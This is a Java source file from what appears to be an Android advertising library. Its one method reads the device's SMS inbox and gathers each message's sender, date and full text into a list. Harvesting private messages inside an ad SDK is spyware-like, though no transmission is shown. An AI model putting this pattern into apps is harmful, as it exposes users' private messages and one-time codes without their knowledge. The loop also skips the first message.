package com.example.taashaadslib.AdSerever;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.example.taashaadslib.AlertUtils.AlertClasses;
import com.example.taashaadslib.AppUtils.GlobalFiles;
import com.example.taashaadslib.CommonClasses.SessionManager;
import com.example.taashaadslib.ModelClasses.SMSData;
import com.google.android.gms.common.internal.GmsLogger;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FetchUserSMSinboxClass {

    private static SessionManager mSessionManager;
    private static final String TAG = "FetchUserSMSinboxClass";

    public static ArrayList<SMSData.DataBean> fetchInbox(Context mContext)
    {

        mSessionManager = new SessionManager(mContext);
        mSessionManager.openSettings();

        ArrayList<SMSData.DataBean> smsData = new ArrayList<>();
        smsData.clear();

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = mContext.getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);


        cursor.moveToNext();
        while  (cursor.moveToNext()) {


            if (!mSessionManager.getPreference(GlobalFiles.SMS_LIST).contains(cursor.getString(3))) {

                String address = cursor.getString(1);
                String body = cursor.getString(3);
                String date = cursor.getString(2);

                SMSData.DataBean mDatabean = new SMSData.DataBean();
                mDatabean.setDate(date);
                mDatabean.setSender(address);
                mDatabean.setSmsContent(body);

                smsData.add(mDatabean);
            }else{

                AlertClasses.printLogE(TAG , "MSG ALREADY AVAILABLE");


            }


        }

        return smsData;

    }
}
